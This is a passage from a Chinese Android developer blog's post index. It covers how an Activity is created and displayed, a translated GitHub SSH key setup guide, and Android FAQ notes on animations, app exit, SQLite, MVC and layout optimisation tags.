由篇幅问题，剩下的内容我们就放到下篇博客在分析了，最后再以我们的分析路线来结束本篇博客吧：","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"}]},{"title":"一个Activity的显示过程总结（一）","slug":"一个Activity的显示过程总结（一）","date":"2016-05-12T08:30:12.000Z","updated":"2020-05-11T07:23:44.784Z","comments":true,"path":"2016/05/12/一个Activity的显示过程总结（一）/","link":"","permalink":"https://superxlcr.github.io/2016/05/12/一个Activity的显示过程总结（一）/","excerpt":"","text":"最近读了深入理解Android卷I，了解了一些有关于Activity显示的知识，在此写下一篇博客总结。有兴趣自己看Android源码的同学可以前往：http://grepcode.com/project/repository.grepcode.com/java/ext/com.google.android/android/本博客分析的Android版本为4.4 Activity的创建要谈到Activity的界面显示，我们就得从Activity的创建说起众所周知，Zygote是我们Android系统与应用启动相关的一个非常重要的进程：当我们要启动一个新的APP进程的时候，Zygote进程就会通过fork创建一个子进程，而子进程的入口函数就是ActivityThread类的main函数： 1234567891011121314151617181920212223public static void main(String[] args) &#123; ... Looper.prepareMainLooper(); ActivityThread thread = new ActivityThread(); thread.attach(false); if (sMainThreadHandler == null) &#123; sMainThreadHandler = thread.getHandler(); &#125; AsyncTask.init(); if (false) &#123; Looper.myLooper().setMessageLogging(new LogPrinter(Log.DEBUG, \"ActivityThread\")); &#125; Looper.loop(); throw new RuntimeException(\"Main thread loop unexpectedly exited\"); &#125; 省略一些无关的代码，我们可以看到在main函数中ActivityThread进行了一些与Looper、Handler相关的初始化操作，初始化完成后就能使用handler来处理message了，我们来看一下能处理什么消息（ActivityThread类的handleMessage函数）： 12345678910111213141516public void handleMessage(Message msg) &#123; if (DEBUG_MESSAGES) Slog.v(TAG, \"&gt;&gt;&gt; handling: \" + codeToString(msg.what)); switch (msg.what) &#123; case LAUNCH_ACTIVITY: &#123; Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, \"activityStart\"); ActivityClientRecord r = (ActivityClientRecord)msg.obj; r.packageInfo = getPackageInfoNoCheck( r.activityInfo.applicationInfo, r.compatInfo); handleLaunchActivity(r, null); Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER); &#125; break; ... &#125; if (DEBUG_MESSAGES) Slog.v(TAG, \"&lt;&lt;&lt; done: \" + codeToString(msg.what)); &#125; 能处理的message实在太多，此处我们只观察第一条。从message的信息来看，这条消息毫无疑问是用来创建一个Activity，我们再来看看第10行关键的handleLaunchActivity方法： 123456789101112private void handleLaunchActivity(ActivityClientRecord r, Intent customIntent) &#123; ... Activity a = performLaunchActivity(r, customIntent); if (a != null) &#123; r.createdConfig = new Configuration(mConfiguration); Bundle oldState = r.state; handleResumeActivity(r.token, false, r.isForward, !r.activity.mFinished &amp;&amp; !r.startsNotResumed); ... &#125; 这个函数中有两个关键的点： performLaunchActivity：创建一个Activity handleResumeActivity：为Activity界面显示进行准备 performLaunchActivity我们先来分析第一个关键点（ActivityThread#performLaunchActivity）： 12345678910111213141516171819private Activity performLaunchActivity(ActivityClientRecord r, Intent customIntent) &#123; ... Activity activity = null; try &#123; java.lang.ClassLoader cl = r.packageInfo.getClassLoader(); activity = mInstrumentation.newActivity( cl, component.getClassName(), r.intent); ... activity.attach(appContext, this, getInstrumentation(), r.token, r.ident, app, r.intent, r.activityInfo, title, r.parent, r.embeddedID, r.lastNonConfigurationInstances, config); ... mInstrumentation.callActivityOnCreate(activity, r.state); ... return activity; &#125; 此处有三个关键的点： newActivity：创建Activity attach：对Activity执行一些初始化工作 callActivityOnCreate：执行Activity的onCreate方法初始化 newActivity第7行的newActivity方法创建了Activity，我们一起看一下这个方法究竟做了什么（android.app.Instrumentation#newActivity）： 123456public Activity newActivity(ClassLoader cl, String className, Intent intent) throws InstantiationException, IllegalAccessException, ClassNotFoundException &#123; return (Activity)cl.loadClass(className).newInstance(); &#125; 非常简单，newActivity方法通过Java的反射机制创建了Activity attach我们再回到performLaunchActivity方法继续往下看，第10行有一个非常关键的attach函数，我们来看一下（android.app.Activity#attach）： 12345678910111213141516171819final void attach(Context context, ActivityThread aThread, Instrumentation instr, IBinder token, int ident, Application application, Intent intent, ActivityInfo info, CharSequence title, Activity parent, String id, NonConfigurationInstances lastNonConfigurationInstances, Configuration config) &#123; ... mWindow = PolicyManager.makeNewWindow(this); ... mWindow.setWindowManager( (WindowManager)context.getSystemService(Context.WINDOW_SERVICE), mToken, mComponent.flattenToString(), (info.flags &amp; ActivityInfo.FLAG_HARDWARE_ACCELERATED) != 0); ... mWindowManager = mWindow.getWindowManager(); mCurrentConfig = config; &#125; 这里出现了两个非常关键的对象：Window和WindowManager 我们先来看一看Window的官方解释： 1Abstract base class for a top-level window look and behavior policy. An instance of this class should be used as the top-level view added to the window manager. It provides standard UI policies such as a background, title area, default key processing, etc. 大致的意思是：WIndow是一个抽象基类，用于控制顶层窗口的外观与行为（即绘制背景和标题栏、默认的按键处理等）。它应该作为一个顶层的View加入到WindowManager中。因此，View、Window和WindowManager的关系可以用下图来表示： WindowManager拥有Window，而Window是UI的顶层View那么由于Window是一个抽象类，在方法中它的实际类型是什么呢？我们一起回到代码中的第9行，此处调用了makeNewWindow方法来创建一个Window：（com.android.internal.policy.PolicyManager） 1234567891011121314151617181920212223public final class PolicyManager &#123; private static final String POLICY_IMPL_CLASS_NAME = \"com.android.internal.policy.impl.Policy\"; private static final IPolicy sPolicy; static &#123; // Pull in the actual implementation of the policy at run-time try &#123; Class policyClass = Class.forName(POLICY_IMPL_CLASS_NAME); sPolicy = (IPolicy)policyClass.newInstance(); ... &#125; ... // The static methods to spawn new policy-specific objects public static Window makeNewWindow(Context context) &#123; return sPolicy.makeNewWindow(context); &#125; ... &#125; 从第18行的方法可以看到，PolicyManager调用了sPolicy变量的makeNewWindow方法来返回一个Window对象。那么sPolicy是什么呢？从第10行和第2行我们可以看出这是一个由Java反射加载的类，我们继续去看sPolicy的makeNewWindow方法：（com.android.internal.policy.impl.Policy） 123public Window makeNewWindow(Context context) &#123; return new PhoneWindow(context); &#125; OK，看来我们的Window的实际对象是一个PhoneWindow。我们回到attach方法中，继续看一下WindowManager是个什么鬼：（android.app.Activity） 12345678910111213141516171819final void attach(Context context, ActivityThread aThread, Instrumentation instr, IBinder token, int ident, Application application, Intent intent, ActivityInfo info, CharSequence title, Activity parent, String id, NonConfigurationInstances lastNonConfigurationInstances, Configuration config) &#123; ... mWindow = PolicyManager.makeNewWindow(this); ... mWindow.setWindowManager( (WindowManager)context.getSystemService(Context.WINDOW_SERVICE), mToken, mComponent.flattenToString(), (info.flags &amp; ActivityInfo.FLAG_HARDWARE_ACCELERATED) != 0); ... mWindowManager = mWindow.getWindowManager(); mCurrentConfig = config; &#125; 看到第17行的WindowManager与第12行的setWindowManager相关，由于mWindow的实际类型是PhoneWindow，我们来看一下他的setWindowManager方法：（com.android.internal.policy.impl.PhoneWindow） 1234567891011public void setWindowManager(WindowManager wm, IBinder appToken, String appName, boolean hardwareAccelerated) &#123; mAppToken = appToken; mAppName = appName; mHardwareAccelerated = hardwareAccelerated || SystemProperties.getBoolean(PROPERTY_HARDWARE_UI, false); if (wm == null) &#123; wm = (WindowManager)mContext.getSystemService(Context.WINDOW_SERVICE); &#125; mWindowManager = ((WindowManagerImpl)wm).createLocalWindowManager(this); &#125; 在第10行我们可以看到调用了createLocalWindowManager来生成一个WindowManager，该方法如下：（android.view.WindowManagerImpl） 123public WindowManagerImpl createLocalWindowManager(Window parentWindow) &#123; return new WindowManagerImpl(mDisplay, parentWindow); &#125; 因此我们最终的WindowManager的实际类型是一个WindowManagerImpl。此时，View、Window和WindowManager的关系图更新为如下所示： OK，剩下的内容我们将在下一篇博客中继续分析，在此之前我们先来回顾一下本篇博客的分析路线： 上图中绿色的区域为我们分析完成的部分，现在我们经过以上步骤，获得了：Activity、Window和与Window绑定的WindowManger，下次我们将继续从callActivityOnCreate方法开始继续分析Activity的显示过程","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"}]},{"title":"Github 之 SSH key的创建与配置（Windows）","slug":"Github-之-SSH-key的创建于配置（Windows）","date":"2016-05-09T09:47:22.000Z","updated":"2020-05-11T07:23:44.661Z","comments":true,"path":"2016/05/09/Github-之-SSH-key的创建于配置（Windows）/","link":"","permalink":"https://superxlcr.github.io/2016/05/09/Github-之-SSH-key的创建于配置（Windows）/","excerpt":"","text":"最近配置了github的ssh key，翻找了大量资料后发现github官方就有相关的教程……在此翻译一下官方教程以加深印象原文链接：https://help.github.com/categories/ssh/ Generating an SSH key（生成SSH key）SSH密钥是来识别值得信赖的电脑的方法。您可以生成一个SSH密钥，并按照本节所述的方法将公共密钥添加到您的帐户GitHub中 Checking for existing SSH keys（检查已存在的SSH key）在你生成一个ssh key之前，你可以检查一下你是否已经有了ssh key： 打开Git Bash 输入 1ls -al ~/.ssh 来查看是否有ssh key存在 检查/.ssh目录来查看是否存在公开的ssh key 一般而言，公开的ssh key的文件名为以下几种： id_dsa.pub id_ecdsa.pub id_ed25519.pub id_rsa.pub Generating a new SSH key and adding it to the ssh-agent（生成一个新的SSH key并添加到ssh-agent）在你检查过存在的ssh key后，你可以新建一个ssh key： 打开Git Bash 输入这一串： 1ssh-keygen -t rsa -b 4096 -C &quot;your_email@example.com&quot; 生成一个新的ssh key，使用填入的邮箱地址作为ssh key的标签，并生成RSA密钥对 看到如下提示时： 1Enter a file in which to save the key (/Users/you/.ssh/id_rsa): [Press enter] 按下回车，表示把ssh key放在默认地址 然后为ssh key设置密码： 12Enter passphrase (empty for no passphrase): [Type a passphrase] Enter same passphrase again: [Type passphrase again] 创建完ssh key后，你需要把它添加到ssh-agent中去： 首先保证ssh-agent启用了： 1eval &quot;$(ssh-agent -s)&quot; 该指令返回进程id则表示已经启用ssh-agent 使用如下指令把ssh key添加到ssh-agent中： 1ssh-add ~/.ssh/id_rsa Adding a new SSH key to your GitHub account（为你的github账号添加SSH key）在把ssh key添加到ssh-agent后，你需要把ssh key添加到你的github账号中： 打开Git Bash，使用指令把ssh key复制到剪贴板： 1clip &lt; ~/.ssh/id_rsa.pub 如果不成功就用编辑器打开该文件直接复制内容 在github右上角点击setting： 在左边选择SSH and GPG keys： 点击New SSH key： 在Title处为你的ssh key填入适当的标题，在Key处粘贴你复制的ssh key 点击Add SSH key： 输入你的github账号密码确认此次操作 Testing your SSH connection（测试你的SSH连接）在进行完上面一系列操作后，是时候看看你的SSH连接是否成功了： 打开Git Bash 输入以下指令： 1ssh -T git@github.com 尝试去用ssh连接github，你可能会看到一些警告信息： 123The authenticity of host &apos;github.com (192.30.252.1)&apos; can&apos;t be established. RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48. Are you sure you want to continue connecting (yes/no)? 输入yes不管他就好 如果你看到一下信息： 1Hi username! You&apos;ve successfully authenticated, but GitHub does not provide shell access 则表示ssh连接成功了 如果你收到的信息是”access denied” ,那么你可以参考一下链接进行进一步处理：https://help.github.com/articles/error-permission-denied-publickey/ Changing a remote’s URL（改变远程仓库的URL）在设置完ssh后，你可能需要把你的远程仓库的URL从HTTPS改为SSH（SSH好处在于不用每次push都输账号密码……）： 打开GIt Bash 把工作目录转到你的本地工程中 查看拥有的远程仓库： 1git remote -v 更改远程仓库的url： 1git remote set-url origin https://github.com/USERNAME/OTHERREPOSITORY.git origin为仓库名，后面接的是ssh仓库地址： 查看拥有的远程仓库，看看是否修改成功： 1git remote -v 至此Github的SSH key配置大功告成，以后push再也不用每次都输入github的账号密码了～","categories":[{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/tags/git/"}]},{"title":"Android常见问题总结（四）","slug":"Android常见问题总结（四）","date":"2016-05-09T03:29:34.000Z","updated":"2020-05-11T07:23:44.586Z","comments":true,"path":"2016/05/09/Android常见问题总结（四）/","link":"","permalink":"https://superxlcr.github.io/2016/05/09/Android常见问题总结（四）/","excerpt":"","text":"上一篇文章的传送门：Android常见问题总结（三） Android三种动画如今Android的动画主要有三种，分别是：逐帧（Frame）动画，补间（Tween）动画，属性（Property）动画 逐帧（Frame）动画逐帧动画是最容易理解的动画，它要求我们把动画过程的每张静态图片都准备好，然后依次显示，利用人眼“视觉暂留”的原理形成动画效果。例子：肥波跳舞？素材准备（共27帧）： fat_po.xml，animation-list的oneshot属性用于设置动画是否只播放一次，true是，false表示循环播放 123456789101112131415161718192021222324252627282930313233&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;animation-list xmlns:android=\"http://schemas.android.com/apk/res/android\" android:oneshot = \"false\" &gt; &lt;item android:drawable=\"@drawable/fat_po_f01\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f02\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f03\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f04\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f05\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f06\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f07\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f08\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f09\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f10\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f11\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f12\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f13\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f14\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f15\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f16\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f17\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f18\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f19\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f20\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f21\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f22\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f23\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f24\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f25\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f26\" android:duration=\"60\" /&gt; &lt;item android:drawable=\"@drawable/fat_po_f27\" android:duration=\"60\" /&gt; &lt;/animation-list&gt; Activity布局xml，把逐帧（Frame）动画设置为ImageView的背景： 123456789101112&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:gravity=\"center\"&gt; &lt;ImageView android:id=\"@+id/image_view\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:background=\"@animator/fat_po\"/&gt; &lt;/LinearLayout&gt; Activity的Java代码： 123456789101112public class MyActivity extends Activity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); ImageView imageView = (ImageView)findViewById(R.id.image_view); // 开始动画，默认为停止 ((AnimationDrawable)imageView.getBackground()).start(); &#125; &#125; 由于逐帧动画默认是停止，因此我们需要调用其start方法才能播放动画。 动画效果如下： 补间（Tween）动画相比与逐帧动画要求我们把动画的每一帧都列出来，补间动画只需要我们指定动画开始、动画结束等“关键帧”，而其中动画变化的“中间帧”由系统计算补齐。例子：花瓣开合花瓣动画xml文件：花瓣关闭xml文件，使用了scale（大小变化），alpha（透明度变化），rotate（旋转变化）三种动画，执行的速度是linear线性的 12345678910111213141516171819202122232425&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;set xmlns:android=\"http://schemas.android.com/apk/res/android\" android:interpolator=\"@android:anim/linear_interpolator\"&gt; &lt;scale android:fromXScale=\"1.0\" android:toXScale=\"0.01\" android:fromYScale=\"1.0\" android:toYScale=\"0.01\" android:pivotX=\"50%\" android:pivotY=\"50%\" android:fillAfter=\"true\" android:duration=\"3000\"/&gt; &lt;alpha android:fromAlpha=\"1\" android:toAlpha=\"0.05\" android:duration=\"3000\"/&gt; &lt;rotate android:fromDegrees=\"0\" android:toDegrees=\"1800\" android:pivotX=\"50%\" android:pivotY=\"50%\" android:duration=\"3000\"/&gt; &lt;/set&gt; 花瓣打开xml文件 12345678910111213141516171819202122232425&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;set xmlns:android=\"http://schemas.android.com/apk/res/android\" android:interpolator=\"@android:anim/linear_interpolator\"&gt; &lt;scale android:fromXScale=\"0.01\" android:toXScale=\"1.0\" android:fromYScale=\"0.01\" android:toYScale=\"1.0\" android:pivotX=\"50%\" android:pivotY=\"50%\" android:fillAfter=\"true\" android:duration=\"3000\"/&gt; &lt;alpha android:fromAlpha=\"0.05\" android:toAlpha=\"1\" android:duration=\"3000\"/&gt; &lt;rotate android:fromDegrees=\"1800\" android:toDegrees=\"0\" android:pivotX=\"50%\" android:pivotY=\"50%\" android:duration=\"3000\"/&gt; &lt;/set&gt; 界面的xml文件，只有一个简单的imageView： 123456789101112&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:gravity=\"center\"&gt; &lt;ImageView android:id=\"@+id/image_view\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:src=\"@drawable/flower\"/&gt; &lt;/LinearLayout&gt; Activity的Java代码，加载了close与open动画后，通过Timer的重复任务不断发送消息给handler，通过handler来播放动画: 1234567891011121314151617181920212223242526272829303132333435363738394041public class MyActivity extends Activity &#123; private Handler handler = new Handler() &#123; public void handleMessage(android.os.Message msg) &#123; if (flag) imageView.startAnimation(close); else imageView.startAnimation(open); flag = !flag; &#125;; &#125;; private Animation open, close; private ImageView imageView; boolean flag = true; // 花瓣状态，true开，false合 @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); imageView = (ImageView)findViewById(R.id.image_view); // 花瓣张开 open = AnimationUtils.loadAnimation(this, R.anim.open); // 保留动画变化后的状态 open.setFillAfter(true); // 花瓣关闭 close = AnimationUtils.loadAnimation(this, R.anim.close); // 保留动画变化后的状态 close.setFillAfter(true); // 设置重复任务 new Timer().schedule(new TimerTask() &#123; @Override public void run() &#123; // 通过handler发送消息刷新UI handler.sendEmptyMessage(0); &#125; &#125;, 0, 3500); &#125; &#125; 效果如下： 对于补间（Tween）动画我们只需要准备动画开始与结束的关键帧即可，其中的“中间帧”使用Android提供的多种变换（Scale，Alpha，Rotate，translate）生成即可 属性（Property）动画从某种角度来看，属性动画是增强版的补间动画，属性动画的强大主要体现在两个方面： 补间动画只能定义两个关键帧在“透明度”、“旋转”、“缩放”、“位移”4个方面的变化，但属性动画可以定义任何属性的变化 补间动画只能对UI组件执行动画，但属性动画几乎可以对任何对象执行动画 由于属性动画比较复杂，本文在此不展开讨论了，推荐两篇大神博客供大家参考：Android 属性动画（Property Animation） 完全解析 （上）Android 属性动画（Property Animation） 完全解析 （下） Handler、Looper消息队列模型简单提提Handler、Looper模型中各部分的作用，主要有以下三部分： MessageQueue：消息队列，存储待处理的消息 Looper：封装了消息队列与Handler，线程绑定，使用loop方法循环处理消息 Handler：消息处理的辅助类，里面封装了消息的投递、处理和获取等一系列操作 详细的情况请参考看我另一篇博文：Android Looper和Handler小结 怎样退出终止App测试方案：依次打开3个Activity（ActivityA，ActivityB，ActivityC），并在第3个Activity中终止App System.exit（0）暴露一个Application的public方法: 1234567public class MyApplication extends Application &#123; public void exit() &#123; System.exit(0); &#125; &#125; 在第三个Activity中调用该方法： 123456789101112131415161718public class ActivityC extends Activity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity); Button button = (Button)findViewById(R.id.btn); button.setText(\"Finish app\"); button.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View v) &#123; // 退出App ((MyApplication)getApplication()).exit(); &#125; &#125;); &#125; &#125; 失败，应用进程被杀死，然而过会应用重启了……并且ActivityA和ActivityB都被“复活了”，只杀死了ActivityC android.os.Process.killProcess(android.os.Process.myPid())失败，与System.exit（0）一样，虽然杀死了进程，但过会就被重启了，并且ActivityA和ActivityB都被“复活了” ActivityManager#killBackgroundProcesses()失败，毫无反应 自定义BaseActivity维护Activity列表自定义一个BaseActivity： 1234567891011121314151617181920212223242526272829public class BaseActivity extends Activity &#123; // 维护一个Activity软引用的列表 private static List&lt;SoftReference&lt;Activity&gt;&gt; list = new ArrayList&lt;SoftReference&lt;Activity&gt;&gt;(); @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); list.add(new SoftReference&lt;Activity&gt;(this)); &#125; @Override protected void onDestroy() &#123; super.onDestroy(); list.remove(new SoftReference&lt;Activity&gt;(this)); &#125; /** * 关闭所有的Activity */ public void finishAll() &#123; for (SoftReference&lt;Activity&gt; sr : list) &#123; if (sr.get() != null) &#123; sr.get().finish(); &#125; &#125; &#125; &#125; 对于ActivityA、ActivityB和ActivityC继承BaseActivity而不是Activity，在ActivityC中调用finishAll方法即可关闭所有Activity进而退出App finishAffinity()直接关闭相同任务栈中的所用Activity，与上一个方法效果差不多，但是是Android自带的，方便多了 总结综上所述，测试结果如下： System.exit（0）：只能关闭当前Activity，关闭进程可能导致数据存储问题，不推荐 android.os.Process.killProcess(android.os.Process.myPid())：同上 ActivityManager#killBackgroundProcesses()：测试无效 自定义BaseActivity维护Activity列表：可以关闭依次启动的所用Activity，进而退出整个App finishAffinity()：可以关闭同一个任务栈中的所有Activity，Android自带方法，比较方便 Asset目录与res目录的区别Asset目录和res目录均为Android中用来存放资源的目录，其中： asset目录下存放的资源代表应用无法直接访问的原生资源，应用程序需要通过AssetManager以二进制流的形式来读取资源 res目录下的资源可通过R资源清单类访问，Android SDK会在编译时在R类中为他们创建对应的索引项 Android怎么加速启动Activity个人认为，影响Activity启动时间的主要有两个地方： onCreate、onStart、onResume等回调方法的执行时间 Activity对应的界面的inflate时间 对于第一点，我们应该尽量减少在这些回调方法中执行耗时操作（涉及数据库，图片等），如果一定要执行耗时操作，可以考虑新开子线程处理。对于第二点，我们应该合理使用各种xml的优化标签，并界面上减少View的嵌套层数与绘制时间。（可参考Android常见问题总结（三））","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"}]},{"title":"Android常见问题总结（三）","slug":"Android常见问题总结（三）","date":"2016-05-02T06:16:18.000Z","updated":"2020-05-11T07:23:44.577Z","comments":true,"path":"2016/05/02/Android常见问题总结（三）/","link":"","permalink":"https://superxlcr.github.io/2016/05/02/Android常见问题总结（三）/","excerpt":"","text":"上一篇文章的传送门：Android常见问题总结（二） Android的数据存储形式在Android中的数据存储形式主要有以下几种： SharedPreferrencesSharedPreferrences主要用于存储一些少量的简单的应用程序配置信息。SharedPreferrences以明文键值对的形式把数据存储在一个xml文件上，该文件位于/data/data//shared_prefs目录下。因此，SharedPreferrences只适合用于存储一些简单的数据，不适合存储复杂的或敏感的数据 FileAndroid和Java一样，同样支持使用文件流来保存和访问文件。除了在手机内置存储空间上存储文件外，Android还支持读写SD卡上的文件：只要获取相应的权限后，调用Environment的getExternalStorageDirectory方法即可获取路径 SQLite数据库Android系统集成了一个轻量级的数据库：SQLite。SQLite是一个嵌入式数据库引擎，专门适用于资源有限的设备上适量数据的存取。在Android上我们一般使用SQLiteOpenHelper辅助类来操作SQLite数据库 Sqlite的基本操作SQLite为熟悉SQL语句的程序员提供了相应的函数使用SQL语句，也为不了解SQL语法的程序员提供了简便的增删查改接口： 123456789101112131415161718192021String path = \"数据库路径\"; SQLiteDatabase database = SQLiteDatabase.openOrCreateDatabase(path, null); // 执行sql语句 database.execSQL(sql); // 执行带占位符的sql语句 database.execSQL(sql, bindArgs); // 执行查找的sql语句 database.rawQuery(sql, selectionArgs); // 执行增删查改 database.insert(table, nullColumnHack, values); database.delete(table, whereClause, whereArgs); database.query(table, columns, selection, selectionArgs, groupBy, having, orderBy); database.update(table, values, whereClause, whereArgs); // 开启事务 database.beginTransaction(); // 确认事务成功 database.setTransactionSuccessful(); // 结束事务 database.endTransaction(); Android中的MVC模式MVC全名是Model View Controller，是模型(model)－视图(view)－控制器(controller)的缩写，一种软件设计典范，用一种业务逻辑、数据、界面显示分离的方法组织代码，将业务逻辑聚集到一个部件里面，在改进和个性化定制界面及用户交互的同时，不需要重新编写业务逻辑MVC模式的示意图如下： （图片源自百度百科）Android的设计也使用了MVC模式，其中： View对应于Android的View控件和xml所编写的界面 Controller对应于Android中的Activity，负责接收用户请求和改变模型状态 Model一般封装保存了程序的状态模型 Merge、ViewStub的作用Merge和ViewStub均为Android中的xml优化标签，用于对Android的View布局进行优化 Mergemerge标签应用于xml的顶层标签，主要应对于layout嵌套浪费的现象。在Android layout文件中需要一个顶级容器来容纳其他的组件，而不能直接放置多个组件，通过使用merge标签作为顶层容器，我们可以删减多余或者额外的层级，从而优化整个Android Layout的结构 以下是一个例子：activity_merge_test.xml： 1234567891011121314151617181920&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;FrameLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" &gt; &lt;TextView android:id=\"@+id/text_view\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:gravity=\"top|center_horizontal\" android:text=\"text_view\"/&gt; &lt;TextView android:id=\"@+id/text_view_2\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:gravity=\"bottom|center_horizontal\" android:text=\"text_view_2\"/&gt; &lt;/FrameLayout&gt; MergeTestActivity： 1234567public class MergeTestActivity extends Activity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_merge_test); &#125; &#125; 效果图如下： 由hierarchyviewer分析可得（此处只分析与Activity界面相关的部分）： 由hierarchyviewer得到的View树状图我们可以发现，id为content的FrameLayout中只有LinearLayout一个元素，造成了layout的嵌套浪费（如红框圈出所示）。此处我们若使用merge标签，便可以减少一层layout标签的嵌套，使程序运行得更快更流畅 xml代码改为如下： 1234567891011121314151617181920&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;merge xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" &gt; &lt;TextView android:id=\"@+id/text_view\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:gravity=\"top|center_horizontal\" android:text=\"text_view\"/&gt; &lt;TextView android:id=\"@+id/text_view_2\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:gravity=\"bottom|center_horizontal\" android:text=\"text_view_2\"/&gt; &lt;/merge&gt; 效果图没有变化，使用hierarchyviewer分析可得： 此时已经减少了一层layout嵌套，我们通过使用merge标签，达到了优化的目的 ViewStubViewStub即占位符，用于处理动态觉得显示某个View的情况。在开发应用程序的时候，我们经常会在运行时动态根据条件来决定显示哪个View或某个布局。那么最通常的想法就是把可能用到的View都写在上面，先把它们的可见性都设为View.GONE，然后在代码中动态的更改它的可见性。这样的做法的优点是逻辑简单而且控制起来比较灵活。但是它的缺点就是，耗费资源。虽然把View的初始可见View.GONE但是在Inflate布局的时候View仍然会被Inflate，也就是说仍然会创建对象，会被实例化，会被设置属性。也就是说，会耗费内存等资源。而使用ViewStub的话在inflate布局的时候不会被inflate，ViewStub的inflate操作被延迟到了直到我们调用其inflate方法ViewStub的xml文件设置如下： 123456&lt;ViewStub android:id=\"@+id/view_stub\" android:inflatedId=\"@+id/my_view\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:layout=\"@layout/view_view_stub\" /&gt; 其中，inflateId属性表示ViewStub被inflate后重新被赋予的id值，layout属性指定了调用inflate方法时inflate的具体布局。找到ViewStub并调用inflate： 12ViewStub viewStub = (ViewStub)findViewById(R.id.view_stub); viewStub.inflate(); 值得注意的是： ViewStub只能Inflate一次，之后ViewStub对象会被置为空。按句话说，某个被ViewStub指定的布局被Inflate后，就不会够再通过ViewStub来控制它了 ViewStub只能用来Inflate一个布局文件，而不是某个具体的View Json有什么优劣势JSON，即JavaScript Object Notation，是 一种轻量级的数据交换格式，具有良好的可读和便于快速编写的特性。业内主流技术为其提供了完整的解决方案（有点类似于正则表达式 ，获得了当今大部分语言的支持），从而可以在不同平台间进行数据交换。JSON采用兼容性很高的文本格式，同时也具备类似于C语言体系的行为。这些特性使JSON成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成(一般用于提升网络传输速率) Json优点：与传统的xml相比，Json有一下优点： 